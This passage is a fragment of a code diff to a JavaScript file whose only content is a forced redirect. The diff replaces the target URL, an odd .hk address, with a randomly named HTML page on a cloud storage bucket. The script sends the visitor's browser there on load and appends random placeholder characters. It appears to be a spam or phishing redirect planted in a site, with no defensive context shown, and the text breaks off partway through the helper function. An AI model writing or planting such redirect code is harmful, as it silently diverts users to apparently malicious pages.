@@ -1,4 +1,4 @@
-var urls=[' http://pbwci.qun.hk./Frr6JqRnaAA_VXTt7qhQmV28msOO#{nnnnnnn}{wwww}',];
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/8d8fbf23ae1643f595d66e086e80f9d4.html#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
